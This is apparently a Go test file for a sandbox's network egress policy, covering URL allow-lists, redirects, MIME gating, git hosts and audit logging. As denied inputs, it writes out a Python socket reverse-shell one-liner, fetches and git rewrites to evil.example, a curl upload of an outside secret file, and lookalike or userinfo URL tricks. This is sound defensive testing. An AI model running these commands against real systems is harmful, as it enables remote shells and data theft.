package sandbox

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/rezen/smash/internal/network"
)

// TestDefaultPolicyDNS pins the default policy to the malware-blocking
// resolver the network package names — losing it in a refactor would
// silently fall back to whatever DNSServer's zero value means.
func TestDefaultPolicyDNS(t *testing.T) {
	if got := DefaultPolicy().DNSServer; got != network.DefaultDNSServer {
		t.Errorf("default DNS server = %q, want %q", got, network.DefaultDNSServer)
	}
}

func TestPolicyAllows(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, "https://releases.astral.sh/", "https://pkg.example/dist")
	cases := map[string]bool{
		"https://releases.astral.sh/installers/uv/latest/uv-installer.sh": true,
		"https://objects.githubusercontent.com/abc":                       true,
		"https://github.com/astral-sh/uv/releases/download/x":             true,
		"https://pkg.example/dist":                                        true, // the prefix path itself
		"https://pkg.example/dist/v1/x.tgz":                               true,
		"https://example.com/":                                            false,
		"https://pkg.example/distant/x":                                   false, // a path prefix matches whole segments
		"http://releases.astral.sh/x":                                     false, // scheme mismatch
		"https://releases.astral.sh:8443/x":                               false, // a non-default port is a different host
	}
	for raw, want := range cases {
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatal(err)
		}
		if got := p.Allows(u); got != want {
			t.Errorf("Allows(%s) = %v, want %v", raw, got, want)
		}
	}
	if p.AllowsTarget("evil.example:443") {
		t.Error("a bare host:port must never be allowed")
	}
}

// TestPolicyRejectsAmbiguousURLs: a URL that READS as an allow-listed host and
// RESOLVES somewhere else is the failure mode of every allow-list that compares
// URLs as text. None of these may pass, on the first request or on a redirect.
func TestPolicyRejectsAmbiguousURLs(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, "https://releases.astral.sh/")
	for _, raw := range []string{
		"https://releases.astral.sh.evil.example/payload.sh", // suffix, not the host
		"https://releases.astral.sh@evil.example/payload.sh", // userinfo: the client dials evil.example
		"https://github.com@evil.example/x",
		"https://github.com/astral-sh/../../evil-org/repo",  // the server normalises this
		"https://github.com/astral-sh/%2e%2e/evil-org/repo", // ditto, percent-encoded
		"https://objects.githubusercontent.com.evil.example/x",
	} {
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatalf("parse %s: %v", raw, err)
		}
		if p.Allows(u) {
			t.Errorf("Allows(%s) = true, want false (resolves to %q)", raw, u.Hostname())
		}
	}
}

// TestPolicyValidate: an entry with no scheme cannot match anything, so the
// policy fails closed — safe, but silent. Validate is how a caller taking the
// list from a user says so instead.
func TestPolicyValidate(t *testing.T) {
	p := DefaultPolicy()
	if err := p.Validate(); err != nil {
		t.Errorf("the default policy should validate: %v", err)
	}
	p.AllowedPrefixes = append(p.AllowedPrefixes, "example.com/dist", "https://ok.example/")
	err := p.Validate()
	if err == nil || !strings.Contains(err.Error(), "example.com/dist") {
		t.Errorf("Validate should name the bad entry; got %v", err)
	}
	if strings.Contains(fmt.Sprint(err), "ok.example") {
		t.Errorf("Validate should not name the good entry; got %v", err)
	}
}

func TestPolicyAllowedHosts(t *testing.T) {
	p := Policy{AllowedHosts: []string{"downloads.example.test", "2001:db8::1"}}
	for target, want := range map[string]bool{
		"https://downloads.example.test/tool":      true,
		"https://DOWNLOADS.EXAMPLE.TEST:8443/tool": true,
		"https://sub.downloads.example.test/tool":  false,
		"downloads.example.test:443":               true,
		"other.example.test:443":                   false,
		"[2001:db8::1]:443":                        true,
	} {
		if got := p.AllowsTarget(target); got != want {
			t.Errorf("AllowsTarget(%q) = %v, want %v", target, got, want)
		}
	}
	if err := p.Validate(); err != nil {
		t.Fatal(err)
	}
	p.AllowedHosts = []string{"downloads.example.test:443"}
	if err := p.Validate(); err == nil {
		t.Error("a manifest host with a port was accepted")
	}
}

func TestPolicyAllowsMIME(t *testing.T) {
	unrestricted := Policy{}
	if !unrestricted.AllowsMIME("text/html") || !unrestricted.AllowsMIME("application/octet-stream") {
		t.Error("a nil list must admit everything — an absent MIME policy is a no-op")
	}
	denyAll := Policy{AllowedMIMETypes: []string{}}
	if denyAll.AllowsMIME("application/gzip") {
		t.Error("an explicit empty list must deny everything")
	}
	p := Policy{AllowedMIMETypes: []string{"application/gzip", "text/*"}}
	for mt, want := range map[string]bool{
		"application/gzip":          true,
		"Application/GZIP":          true, // case-insensitive
		"text/plain":                true, // wildcard
		"text/plain; charset=utf-8": true, // parameters stripped
		"text/x-shellscript":        true,
		"application/octet-stream":  false,
		"application/gzip2":         false,
		"image/png":                 false,
		"":                          false, // unparseable fails closed
	} {
		if got := p.AllowsMIME(mt); got != want {
			t.Errorf("AllowsMIME(%q) = %v, want %v", mt, got, want)
		}
	}
}

// TestPolicyValidateMIME: like a schemeless URL prefix, a malformed MIME entry
// would fail closed silently; Validate names it instead.
func TestPolicyValidateMIME(t *testing.T) {
	good := DefaultPolicy()
	good.AllowedMIMETypes = []string{"application/gzip", "TEXT/*", " text/plain "}
	if err := good.Validate(); err != nil {
		t.Errorf("valid entries should validate: %v", err)
	}
	for _, entry := range []string{"*/*", "*", "gzip", "text/plain; charset=utf-8", "text/*x", "*/gzip"} {
		p := DefaultPolicy()
		p.AllowedMIMETypes = []string{"application/gzip", entry}
		err := p.Validate()
		if err == nil || !strings.Contains(err.Error(), entry) {
			t.Errorf("Validate should name the bad entry %q; got %v", entry, err)
		}
		if strings.Contains(err.Error(), "application/gzip\"") {
			t.Errorf("Validate should not name the good entry; got %v", err)
		}
	}
}

// TestURLAllowListStopsDownload: even when the downloader is permitted, a fetch
// to an off-list URL is refused in-process (curl/wget never shell out).
func TestURLAllowListStopsDownload(t *testing.T) {
	_, er, err := runConfined(t, `curl -sSfL https://rvm.example/rvm/archive/master.tar.gz -o rvm.tgz`)
	if err == nil || !strings.Contains(er, "URL not in allow-list") {
		t.Errorf("expected a URL-allow-list denial; stderr=%q err=%v", er, err)
	}
}

// TestCurlFollowsOnlyWithL: the in-process curl honours -L. Without it the 3xx
// response itself is returned, as real curl does; with it the redirect is
// followed (and re-checked against the allow-list on every hop).
func TestCurlFollowsOnlyWithL(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/redir":
			http.Redirect(w, r, "/final", http.StatusFound)
		case "/final":
			w.Write([]byte("FINAL"))
		case "/off":
			http.Redirect(w, r, "https://evil.example/x", http.StatusFound)
		}
	}))
	defer srv.Close()
	local := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	if out, _, err := runConfined(t, "curl -s "+srv.URL+"/redir", local); err != nil || strings.Contains(out, "FINAL") {
		t.Errorf("curl without -L must not follow; out=%q err=%v", out, err)
	}
	if out, _, err := runConfined(t, "curl -sL "+srv.URL+"/redir", local); err != nil || !strings.Contains(out, "FINAL") {
		t.Errorf("curl -L should follow; out=%q err=%v", out, err)
	}
	if out, _, err := runConfined(t, "wget -q -O - "+srv.URL+"/redir", local); err != nil || !strings.Contains(out, "FINAL") {
		t.Errorf("wget follows by default; out=%q err=%v", out, err)
	}
	if _, er, err := runConfined(t, "curl -sL "+srv.URL+"/off", local); err == nil || !strings.Contains(er, "disallowed URL") {
		t.Errorf("a redirect to an off-list host must be refused; stderr=%q err=%v", er, err)
	}
	// -w '%{redirect_url}' on an unfollowed 3xx prints the absolute target
	// (warp's version probe); on a final response it prints nothing.
	if out, _, err := runConfined(t, "curl -fsS -o /dev/null -w '%{redirect_url}' "+srv.URL+"/redir", local); err != nil || out != srv.URL+"/final" {
		t.Errorf("redirect_url = %q, want %q; err=%v", out, srv.URL+"/final", err)
	}
	if out, _, err := runConfined(t, "curl -fsS -o /dev/null -w '[%{redirect_url}][%{http_code}]' "+srv.URL+"/final", local); err != nil || out != "[][200]" {
		t.Errorf("redirect_url on a 200 = %q, want \"[][200]\"; err=%v", out, err)
	}
}

func TestCurlRequestBody(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("read body: %v", err)
		}
		fmt.Fprintf(w, "%s|%s|%s", r.Method, r.Header.Get("Content-Type"), body)
	}))
	defer srv.Close()
	allow := func(c *Config) {
		c.Network.AllowedPrefixes = []string{srv.URL}
		c.Network.AllowedMethods["POST"] = true
	}

	out, er, err := runConfined(t, "curl -s -d a=b -d 'c=d e' "+srv.URL, allow)
	if err != nil || out != "POST|application/x-www-form-urlencoded|a=b&c=d e" {
		t.Fatalf("literal body = %q, stderr=%q, err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "curl -s --data-urlencode 'q=a b' "+srv.URL, allow)
	if err != nil || !strings.HasSuffix(out, "|q=a%20b") {
		t.Fatalf("urlencoded body = %q, stderr=%q, err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "printf 'a\\nb\\n' > body; curl -s --data-binary @body "+srv.URL, withHome(t), allow)
	if err != nil || !strings.HasSuffix(out, "|a\nb\n") {
		t.Fatalf("file body = %q, stderr=%q, err=%v", out, er, err)
	}

	outside := t.TempDir() + "/secret"
	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, er, err = runConfined(t, "curl -s --data-binary @"+strconv.Quote(outside)+" "+srv.URL, allow)
	if err == nil || !strings.Contains(er, "refusing to read request body outside") {
		t.Fatalf("outside body file was not refused: stderr=%q err=%v", er, err)
	}
	_, er, err = runConfined(t, "curl -s -d abcd "+srv.URL, allow, func(c *Config) { c.Network.MaxRequest = 3 })
	if err == nil || !strings.Contains(er, "request body exceeded 3 bytes") {
		t.Fatalf("oversize body was not refused: stderr=%q err=%v", er, err)
	}
}

// TestGitHubPrefixes: the GitHub set covers a release download end to end —
// the release page, its API, the asset redirect target — and nothing broader.
func TestGitHubPrefixes(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, GitHubPrefixes()...)
	for _, u := range []string{
		"https://github.com/trufflesecurity/trufflehog/releases/latest",
		"https://api.github.com/repos/aquasecurity/trivy/releases/latest",
		"https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh",
		"https://objects.githubusercontent.com/github-production-release-asset-2e65be/x",
		"https://release-assets.githubusercontent.com/github-production-release-asset/x",
		"https://codeload.github.com/o/r/tar.gz/refs/tags/v1",
	} {
		if !p.AllowsTarget(u) {
			t.Errorf("%s should be allowed", u)
		}
	}
	for _, u := range []string{"https://github.com.evil.example/x", "http://github.com/x", "https://gist.github.com/x", "https://github.com@evil.example/x"} {
		if p.AllowsTarget(u) {
			t.Errorf("%s should not be allowed", u)
		}
	}
}

// TestInterpreterEgress: allow-listing an interpreter grants the interpreter,
// not the network. An offline one-liner runs; the one-line server and the
// socket reverse shell are still held by the egress guard, and the denial
// names the endpoint the code dialled rather than just "python3".
func TestInterpreterEgress(t *testing.T) {
	allowPython := func(c *Config) { c.Allowed = c.Allowed.With("python3") }
	if out, er, err := runConfined(t, `python3 -c 'print("offline")'`, allowPython); err != nil || !strings.Contains(out, "offline") {
		t.Errorf("an offline python one-liner should run when allow-listed; out=%q stderr=%q err=%v", out, er, err)
	}
	for script, want := range map[string]string{
		`python3 -m http.server 8000`: "python3 → http.server 8000",
		`python3 -c 'import socket;s=socket.socket();s.connect(("10.0.0.1",1234))'`:           "python3 → 10.0.0.1:1234",
		`python3 -c 'import urllib.request;urllib.request.urlopen("https://evil.example/x")'`: "python3 → https://evil.example/x",
	} {
		_, er, err := runConfined(t, script, allowPython)
		if err == nil || !strings.Contains(er, "network egress denied: "+want) {
			t.Errorf("%q should be denied as %q; stderr=%q err=%v", script, want, er, err)
		}
	}
}

// TestGitEgress: when git is explicitly granted, the egress guard holds its
// remote operations to Policy.GitHosts by host — over https, ssh, git:// and
// the scp-like form alike — and still honours the URL prefix list.
func TestGitEgress(t *testing.T) {
	p := DefaultPolicy()
	for target, want := range map[string]bool{
		"https://github.com/o/r.git":          true,
		"https://gitlab.com/o/r":              true,
		"git@bitbucket.org:o/r.git":           true,
		"ssh://git@github.com:22/o/r":         true,
		"git://github.com/o/r":                true,
		"https://gist.github.com/x":           true,  // subdomain
		"https://github.com.evil.example/o/r": false, // not a subdomain
		"git@evil.example:o/r":                false,
		"https://evil.example/o/r":            false,
		"origin":                              false, // a remote name: the guard resolves it first
		"file:///srv/mirror/r":                true,  // a local remote reaches no network
		"https://releases.astral.sh/x":        false, // AllowedPrefixes does not grant git
	} {
		if got := p.AllowsGit(target); got != want {
			t.Errorf("AllowsGit(%q) = %v, want %v", target, got, want)
		}
	}
	p.GitHosts = []string{"git.corp.example"}
	if p.AllowsGit("https://github.com/o/r") || !p.AllowsGit("git@git.corp.example:o/r") {
		t.Error("GitHosts should replace the default forges")
	}
	// End to end: explicitly granted git runs, an off-list clone is denied before it
	// spawns, and a bare `git fetch` outside any repository resolves to no
	// host so it is denied too.
	out, stderr, _ := runConfined(t, `
git --version
git clone https://evil.example/o/r
git fetch
`, func(c *Config) { c.Allowed = c.Allowed.With("git") })
	if !strings.Contains(out, "git version") {
		t.Errorf("explicitly granted git should run; out=%q stderr=%q", out, stderr)
	}
	for _, want := range []string{"egress denied: git → https://evil.example/o/r", "egress denied: git → origin"} {
		if !strings.Contains(stderr, want) {
			t.Errorf("stderr missing %q:\n%s", want, stderr)
		}
	}
	for _, script := range []string{
		`git submodule update --init`,
		`git -c 'url.https://evil.example/.insteadOf=https://github.com/' clone https://github.com/o/r`,
	} {
		_, stderr, err := runConfined(t, script, func(c *Config) { c.Allowed = c.Allowed.With("git") })
		if err == nil || !strings.Contains(stderr, "network egress denied: git") {
			t.Errorf("unsafe git form was not denied: %q stderr=%q err=%v", script, stderr, err)
		}
	}
}

// TestMultipleURLsRefused: a Request carries one URL, but curl takes several
// and pairs them with successive -o names. Serving only the first would fetch
// part of what was asked for and say nothing about the rest, so the whole
// invocation is refused and the dropped URLs are named.
func TestMultipleURLsRefused(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("body"))
	}))
	defer srv.Close()
	allowLocal := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	_, er, err := runConfined(t, "curl -fsS "+srv.URL+"/a "+srv.URL+"/b -o out", allowLocal)
	if err == nil {
		t.Fatalf("two URLs in one fetch should be refused; stderr=%q", er)
	}
	for _, want := range []string{"one URL per invocation", "/a", "/b"} {
		if !strings.Contains(er, want) {
			t.Errorf("stderr should name what was dropped (%q); got %q", want, er)
		}
	}
	// One URL plus a non-URL operand is still an ordinary fetch.
	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/a", allowLocal); err != nil || out != "body" {
		t.Errorf("a single URL should work; out=%q stderr=%q err=%v", out, er, err)
	}
}

// TestMIMEAllowList: with mime-types set, a response body must both declare an
// allowed Content-Type and not sniff as something off-list. Absent policy,
// HEAD requests and empty bodies are untouched.
func TestMIMEAllowList(t *testing.T) {
	tarball := tarballBytes(t, map[string]string{"bin/x": "#!/bin/sh\n"})
	html := "<!DOCTYPE html><html><body>maintenance</body></html>"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/tool.tgz":
			w.Header().Set("Content-Type", "application/gzip")
			w.Write(tarball)
		case "/install.sh":
			w.Header().Set("Content-Type", "text/x-shellscript")
			io.WriteString(w, "#!/bin/sh\necho hi\n")
		case "/page":
			w.Header().Set("Content-Type", "text/html")
			io.WriteString(w, html)
		case "/mislabeled":
			w.Header().Set("Content-Type", "application/gzip")
			io.WriteString(w, html)
		case "/no-type":
			w.Header()["Content-Type"] = nil // suppress Go's auto-detection
			io.WriteString(w, "hello")
		case "/params":
			w.Header().Set("Content-Type", "text/plain; charset=utf-8")
			io.WriteString(w, "plain")
		case "/empty":
			w.Header()["Content-Type"] = nil
		}
	}))
	defer srv.Close()
	mimePolicy := func(types ...string) option {
		if types == nil {
			types = []string{} // mimePolicy() is the explicit deny-all list, not "unset"
		}
		return func(c *Config) {
			c.Network.AllowedPrefixes = []string{srv.URL}
			c.Network.AllowedMIMETypes = types
		}
	}

	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/tool.tgz -o t.tgz", withHome(t), mimePolicy("application/gzip")); err != nil {
		t.Errorf("an allowed archive should download (gzip sniffs as application/x-gzip); stderr=%q err=%v", er, err)
	}
	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/install.sh", mimePolicy("text/*")); err != nil || !strings.Contains(out, "echo hi") {
		t.Errorf("a text/* wildcard should admit a shell script; out=%q stderr=%q err=%v", out, er, err)
	}
	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/params", mimePolicy("text/plain")); err != nil || out != "plain" {
		t.Errorf("Content-Type parameters should be ignored; out=%q stderr=%q err=%v", out, er, err)
	}
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/page", mimePolicy("application/gzip")); err == nil ||
		!strings.Contains(er, `[sandbox] response Content-Type "text/html" not in mime-types allow-list`) {
		t.Errorf("an off-list declared type should be refused; stderr=%q err=%v", er, err)
	}
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/mislabeled -o t.tgz", withHome(t), mimePolicy("application/gzip")); err == nil ||
		!strings.Contains(er, `sniffs as "text/html"`) || !strings.Contains(er, `declared "application/gzip"`) {
		t.Errorf("a body contradicting its declared type should be refused, naming both; stderr=%q err=%v", er, err)
	}
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/no-type", mimePolicy("text/plain")); err == nil ||
		!strings.Contains(er, "no Content-Type") {
		t.Errorf("a missing Content-Type should be refused while the list is set; stderr=%q err=%v", er, err)
	}
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/install.sh", mimePolicy()); err == nil ||
		!strings.Contains(er, "not in mime-types allow-list") {
		t.Errorf("mime-types [] should deny every body; stderr=%q err=%v", er, err)
	}
	// The exemptions: HEAD delivers no body; an empty body delivers nothing;
	// and without a list the gate does not exist at all.
	if _, er, err := runConfined(t, "curl -sfI "+srv.URL+"/page", mimePolicy("application/gzip")); err != nil {
		t.Errorf("HEAD has no body to gate; stderr=%q err=%v", er, err)
	}
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/empty", mimePolicy("application/gzip")); err != nil {
		t.Errorf("an empty body has nothing to gate; stderr=%q err=%v", er, err)
	}
	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/page",
		func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }); err != nil || out != html {
		t.Errorf("absent mime-types must stay a no-op; out=%q stderr=%q err=%v", out, er, err)
	}

	// The audit trail carries both types — on success and, with the denial's
	// reason, on refusal.
	var recs []AuditRecord
	_, _, err := runConfined(t, "curl -fsS "+srv.URL+"/tool.tgz -o t.tgz && curl -fsS "+srv.URL+"/mislabeled",
		withHome(t), mimePolicy("application/gzip"), collectAudit(&recs))
	if err == nil {
		t.Fatal("the mislabeled fetch should have failed the run")
	}
	var ok, denied bool
	for _, r := range recs {
		if r.Name != "curl" {
			continue
		}
		switch {
		case r.Exit == nil:
			ok = r.ContentType == "application/gzip" && r.Sniffed == "application/x-gzip"
			if !ok {
				t.Errorf("allowed fetch audited as content-type=%q sniffed=%q", r.ContentType, r.Sniffed)
			}
		default:
			denied = r.ContentType == "application/gzip" && r.Sniffed == "text/html" &&
				strings.Contains(r.Reason, `sniffs as "text/html"`)
			if !denied {
				t.Errorf("denied fetch audited as content-type=%q sniffed=%q reason=%q", r.ContentType, r.Sniffed, r.Reason)
			}
		}
	}
	if !ok || !denied {
		t.Errorf("expected one allowed and one denied curl record; got %d records", len(recs))
	}
}

// TestDownloaderVersionAndHelp: probes must answer in-process — installers
// branch on them (vector.sh sniffs `wget -V` for BusyBox) — and must not
// fail "no URL specified" or trip the URL allow-list.
func TestDownloaderVersionAndHelp(t *testing.T) {
	for _, script := range []string{"curl --version", "curl --help", "wget -V", "wget --help"} {
		out, er, err := runConfined(t, script)
		if err != nil || out == "" {
			t.Errorf("%q: out=%q stderr=%q err=%v", script, out, er, err)
		}
		if strings.Contains(er, "no URL specified") || strings.Contains(er, "not in allow-list") {
			t.Errorf("%q: a probe hit the fetch path: stderr=%q", script, er)
		}
	}
	// vector.sh's BusyBox sniff: first word of line 2 (or line 1 of shorter
	// output) of `wget -V`.
	out, _, err := runConfined(t, `wget -V 2>&1 | head -2 | tail -1 | cut -f1 -d" "`)
	if err != nil || strings.TrimSpace(out) == "BusyBox" || strings.TrimSpace(out) == "" {
		t.Errorf("wget -V sniff = %q, err=%v; must not read as BusyBox", out, err)
	}
}

// TestWgetDefaultFilename: real wget derives the output filename from the
// URL when -O is absent; -O - still streams to stdout.
func TestWgetDefaultFilename(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("payload:" + r.URL.Path))
	}))
	defer srv.Close()
	local := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	out, er, err := runConfined(t, "wget -q "+srv.URL+"/dl/tool.tgz && cat tool.tgz", withHome(t), local)
	if err != nil || out != "payload:/dl/tool.tgz" {
		t.Errorf("bare wget should create tool.tgz; out=%q stderr=%q err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "wget -q "+srv.URL+"/dir/ && cat index.html", withHome(t), local)
	if err != nil || out != "payload:/dir/" {
		t.Errorf("a bare-directory URL should write index.html; out=%q stderr=%q err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "wget -q -O - "+srv.URL+"/x", local)
	if err != nil || out != "payload:/x" {
		t.Errorf("wget -O - must stream to stdout; out=%q stderr=%q err=%v", out, er, err)
	}
}

// TestSniffRefinesOctetStream: a server that only says octet-stream tells
// the reviewer nothing — the audit's sniffed type names what the asset
// actually is (magic bytes), and the refinement never costs a download that
// an octet-stream allow-list admitted.
func TestSniffRefinesOctetStream(t *testing.T) {
	tarHead := make([]byte, 600)
	copy(tarHead[257:], "ustar")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		switch r.URL.Path {
		case "/asset.tar":
			w.Write(tarHead)
		case "/tool":
			w.Write([]byte{0x7F, 'E', 'L', 'F', 2, 1, 1, 0})
		}
	}))
	defer srv.Close()
	local := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	var recs []AuditRecord
	_, er, err := runConfined(t, "curl -fsS "+srv.URL+"/asset.tar -o a.tar && curl -fsS "+srv.URL+"/tool -o tool",
		withHome(t), local, collectAudit(&recs),
		func(c *Config) { c.Network.AllowedMIMETypes = []string{"application/octet-stream"} })
	if err != nil {
		t.Fatalf("refined sniffs must not fail an octet-stream allow-list; stderr=%q err=%v", er, err)
	}
	want := map[string]bool{"application/x-tar": false, "application/x-executable": false}
	for _, r := range recs {
		if r.Name == "curl" && r.Exit == nil {
			if _, ok := want[r.Sniffed]; !ok {
				t.Errorf("sniffed = %q (declared %q), want a refined file type", r.Sniffed, r.ContentType)
				continue
			}
			want[r.Sniffed] = true
		}
	}
	for typ, seen := range want {
		if !seen {
			t.Errorf("no audit record sniffed as %s", typ)
		}
	}
}

// TestDownloaderRecordsVia: the audit carries the response's media types for
// every download (no MIME policy required) and the hosts a redirect chain
// passed through; the text log prints via only when it adds information.
func TestDownloaderRecordsVia(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/redir":
			http.Redirect(w, r, "/final", http.StatusFound)
		default:
			w.Header().Set("Content-Type", "text/plain")
			w.Write([]byte("FINAL"))
		}
	}))
	defer srv.Close()

	var recs []AuditRecord
	_, er, err := runConfined(t, "curl -sL "+srv.URL+"/redir",
		func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }, collectAudit(&recs))
	if err != nil {
		t.Fatalf("stderr=%q err=%v", er, err)
	}
	var seen bool
	for _, r := range recs {
		if r.Name != "curl" || r.Exit != nil {
			continue
		}
		seen = true
		if !slices.Equal(r.Via, []string{"127.0.0.1"}) {
			t.Errorf("Via = %v, want the (deduped) redirect chain", r.Via)
		}
		if r.ContentType != "text/plain" || r.Sniffed != "text/plain" {
			t.Errorf("content types = %q/%q; observation must not require a MIME policy", r.ContentType, r.Sniffed)
		}
	}
	if !seen {
		t.Fatalf("no successful curl record in %d records", len(recs))
	}

	// Rendering: two hosts print a via line, one host prints nothing.
	var buf lockedBuffer
	a := TextAuditor(&buf)
	a.Audit(AuditRecord{Name: "curl", Via: []string{"a.example", "b.example"}, Duration: time.Millisecond})
	a.Audit(AuditRecord{Name: "curl", Via: []string{"a.example"}, Duration: time.Millisecond})
	logText := buf.String()
	if !strings.Contains(logText, "via: [a.example, b.example]") {
		t.Errorf("two-host via line missing:\n%s", logText)
	}
	if strings.Count(logText, "via:") != 1 {
		t.Errorf("a single-host chain must not print via:\n%s", logText)
	}
}

// TestProfileModeDownloadsInProcess: profile mode serves curl through the
// same in-process downloader under the observe config — the policy under
// construction (broken resolver, empty allow-list, closed methods) must not
// interfere, while smash's own write confinement still holds.
func TestProfileModeDownloadsInProcess(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(r.Method + " ok"))
	}))
	defer srv.Close()
	profiled := func(c *Config) {
		c.Profile = true
		c.Network.DNSServer = "not-an-ip" // must not break the observe transport
	}

	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/x", profiled); err != nil || out != "GET ok" {
		t.Errorf("profile fetch failed under a hostile policy; out=%q stderr=%q err=%v", out, er, err)
	}
	if out, er, err := runConfined(t, "curl -fsS -X DELETE "+srv.URL+"/x", profiled); err != nil || out != "DELETE ok" {
		t.Errorf("observe mode must admit every method; out=%q stderr=%q err=%v", out, er, err)
	}
	outside := t.TempDir() + "/stolen.bin"
	if _, er, err := runConfined(t, "curl -fsS "+srv.URL+"/x -o "+strconv.Quote(outside), profiled); err == nil ||
		!strings.Contains(er, "refusing to write outside") {
		t.Errorf("observe mode must keep smash's own writes in root; stderr=%q err=%v", er, err)
	}
}
